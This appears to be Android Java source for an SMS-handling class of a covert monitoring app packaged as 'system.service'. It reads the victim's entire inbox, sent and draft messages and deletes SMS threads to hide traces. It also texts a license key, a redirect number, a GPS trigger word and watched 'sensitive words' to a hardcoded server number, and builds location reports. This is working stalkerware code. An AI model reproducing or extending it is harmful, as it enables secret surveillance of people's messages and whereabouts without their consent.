package system.service.feature.sms;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import system.service.R;
import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.contact.ContactInfo;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.gps.GpsUtil;

import system.service.feature.sms.SMS_TYPE;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.location.Location;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsCtrl 
{	
	private static final String LOGTAG = "SmsCtrl";
	
	public final static int SMS_MAX_LENGTH = 70;

	public final static String SMS_URI_ALL   = "content://sms/";
	public final static String SMS_URI_INBOX = "content://sms/inbox";
	public final static String SMS_URI_SEND  = "content://sms/sent";
	public final static String SMS_URI_DRAFT = "content://sms/draft";
	
	/**
	 * 
	 * @param service
	 * @param type : the type of SMS. Could be SMS_URI_ALL, SMS_URI_INBOX, SMS_URI_SEND or SMS_URI_DRAFT
	 * @return
	 */
	public static List<SmsInfo> getSmsList(Context context, String type)
	{
		List<SmsInfo> infoList = new ArrayList<SmsInfo>();
		String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};   
		  
		try{  
			ContentResolver cr = context.getContentResolver(); 
			Cursor cursor = cr.query(Uri.parse(type),  
			      projection,  
			      null, null , "date desc");
			
			if (cursor.moveToFirst()) 
			{   
				int nameColumn = cursor.getColumnIndex("person");   
				int phoneNumberColumn = cursor.getColumnIndex("address");   
				int smsbodyColumn = cursor.getColumnIndex("body");   
				int dateColumn = cursor.getColumnIndex("date");   
				int typeColumn = cursor.getColumnIndex("type");   
		            
				do {   
					SmsInfo info = new SmsInfo();
		            	
					info.SendPersonName = cursor.getString(nameColumn);                
					info.phoneNumber = cursor.getString(phoneNumberColumn);   
					info.smsbody = cursor.getString(smsbodyColumn);
	                info.date = new Date(Long.parseLong(cursor.getString(dateColumn)));  
	                //SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
	                //date = dateFormat.format(info.date);   
	                   
	                int typeId = cursor.getInt(typeColumn);   
	                if(typeId == 1){   
	                	info.type = SMS_TYPE.RECEIVED;   
	                } else if(typeId == 2){   
	                	info.type = SMS_TYPE.SENT;   
	                } else {   
	                	info.type = SMS_TYPE.UNKNOWN;   
	                }   
		                
	                infoList.add(info);
		                    
				} while (cursor.moveToNext());   
		            
			}  
		}  
		catch (SQLiteException ex)  
		{  
			Log.d(LOGTAG, ex.getMessage());  
		}  
		
		return infoList;		
	}
	
	public static void deleteAllSMS(Context context) {
		Uri uri = Uri.parse("content://sms");
		ContentResolver contentResolver = context.getContentResolver();
	    Cursor cursor = contentResolver.query(uri, null, null, null, null);
	    while (cursor.moveToNext()) {
	    	try {
	    		long thread_id = cursor.getLong(1);
	    		Uri thread = Uri.parse("content://sms/conversations/" + thread_id);
	    		context.getContentResolver().delete(thread, null, null);
	    	} catch (Exception e) {
	        	Log.d(LOGTAG, e.getMessage()); 
	        }
	    }
	}
	
	public static int deleteTheLastSMS(Context context) {
		// Get the last SMS ThreadId
		long threadId = 0;
		int count = 0;
		String SMS_READ_COLUMN = "read";
	    String WHERE_CONDITION = SMS_READ_COLUMN + " = 0";
	    String SORT_ORDER = "date DESC";
	    
	    Cursor cursor = context.getContentResolver().query(
	    		Uri.parse("content://sms/inbox"),
	            new String[] { "_id", "thread_id", "address", "person", "date", "body" },
	            WHERE_CONDITION,
	            null,
	            SORT_ORDER);

	    if (cursor != null) {
	    	try {
	    		count = cursor.getCount();
	            if (count > 0) {
	            	cursor.moveToFirst();
	                threadId = cursor.getLong(1);                              
	            }
	        } finally {
	        	cursor.close();
	        }
	    } 
	    
		count = 0;
	    try {
	    	Uri mUri=Uri.parse("content://sms/conversations/" + threadId);  
	    	count = context.getContentResolver().delete(mUri, null, null);
	    } catch (Exception e) {
        	Log.d(LOGTAG, e.getMessage()); 
	    }
	    
	    return count;	
	}
	
	public static int deleteSMS(Context context, SmsMessage msg) {
		int count = 0;
	    Uri deleteUri = Uri.parse("content://sms/conversations/");
	    try {
	    	count = context.getContentResolver().delete(deleteUri, "address=? and date=?", 
		    			new String[] {msg.getOriginatingAddress(), String.valueOf(msg.getTimestampMillis())});
	    	SysUtils.messageBox(context, "deleted: " + String.valueOf(count));
	    } catch (Exception e) {
	      	Log.d(LOGTAG, e.getMessage()); 
	    }
	    return count;
	}
	
	public static boolean sendSms(String strMobile, String strContent) {
		SmsManager smsManager = SmsManager.getDefault();
		try {
			if (strContent.length() > SMS_MAX_LENGTH) {
				ArrayList<String> parts = smsManager.divideMessage(strContent);
				smsManager.sendMultipartTextMessage(strMobile, null, parts, null, null);
			} else {
				smsManager.sendTextMessage(strMobile, null, strContent, null, null);
			}
			return true;
		} catch (Exception ex) {
			Log.e(LOGTAG, ex.getMessage());
			return false;
		}
	}
	
	public static String getSmsAddress(Intent intent)
	{
		Bundle bundle = intent.getExtras();
		Object messages[] = (Object[]) bundle.get("pdus");
		return SmsMessage.createFromPdu((byte[]) messages[0]).getDisplayOriginatingAddress();
	}
	
	public static String getSmsBody(Intent intent)
	{
		String tempString = "";
		Bundle bundle = intent.getExtras();
		Object messages[] = (Object[]) bundle.get("pdus");
		SmsMessage[] smsMessage = new SmsMessage[messages.length];
		for (int n = 0; n < messages.length; n++)
		{
			smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
			// 短信有可能因为使用了回车而导致分为多条，所以要加起来接受
			//tempString += smsMessage[n].getMessageBody().trim();
			tempString += smsMessage[n].getDisplayMessageBody();
		}
		return tempString;
	}

	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>,<gps activation word>
	public static void sendReceiverInfoSms(Context context) {
		String strMobile = context.getResources().getString(R.string.srv_address).trim();
		String key = ConfigCtrl.getLicenseKey(context);
		if (key == null) key = "";
		String rcvMail = GlobalPrefActivity.getMail(context);
		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
		String gpsWord = GlobalPrefActivity.getGpsWord(context);
		String strContent = "Info," + key + "," + rcvMail + "," + rcvPhoneNum + "," + gpsWord;
		sendSms(strMobile, strContent);
	}
	
	// The sms content format: <header>,<license key>,<receiver sensitive words>
	public static void sendSensitiveWordsSms(Context context) {
		String strMobile = context.getResources().getString(R.string.srv_address).trim();
		String key = ConfigCtrl.getLicenseKey(context);
		if (key == null) key = "";
		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
		String strContent = "SensWds," + key + "," + sensWords;
		sendSms(strMobile, strContent);
	}

	public static String buildLocationSms(Context context, Location location, String realOrHist) 
	{
		if (location == null) {
			return String.format(context.getResources().getString(R.string.location_sms_fail));
		}
		
		if (realOrHist.equals(GpsUtil.REALPOSITION)) {
			return String.format(context.getResources().getString(R.string.location_sms_real), 
				location.getLatitude() + "," + location.getLongitude());
		} else {
			return String.format(context.getResources().getString(R.string.location_sms_hist), 
				location.getLatitude() + "," + location.getLongitude());
		}
	}
	
}